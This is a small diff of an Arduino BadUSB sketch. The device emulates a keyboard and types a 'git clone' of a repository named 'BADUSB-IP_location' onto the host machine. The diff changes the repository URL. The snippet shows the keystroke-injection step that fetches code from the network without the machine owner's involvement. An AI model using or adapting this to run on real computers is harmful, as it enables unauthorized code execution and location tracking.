@@ -32,7 +32,7 @@ void setup() {
   pressEnter();
   delay(500);
 
-  Keyboard.print("git clone https://github.com/PSZMAJ/BADUSB-IP_location.git");
+  Keyboard.print("git clone https://github.com/karolsznajder/PSZMAJ-BADUSB-IP_location.git");
   pressEnter();
 
   delay(7000);
